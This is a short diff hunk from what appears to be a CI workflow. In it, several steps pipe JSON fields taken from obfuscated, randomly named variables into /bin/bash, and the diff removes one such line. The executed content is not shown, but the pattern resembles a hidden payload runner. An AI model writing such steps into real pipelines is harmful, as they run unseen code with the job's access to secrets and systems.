@@ -50,7 +50,6 @@ jobs:
           printf '%s' "$lse1625" | jq -r .lnf842 | /bin/bash
           printf '%s' "$j78149" | jq -r .sy91757 | /bin/bash
           printf '%s' "$ow262" | jq -r .ffrw1 | /bin/bash
-          echo $nlu5 | jq -r .kowr00213 | /bin/bash
 
       - name: Store artifact
         if: always()
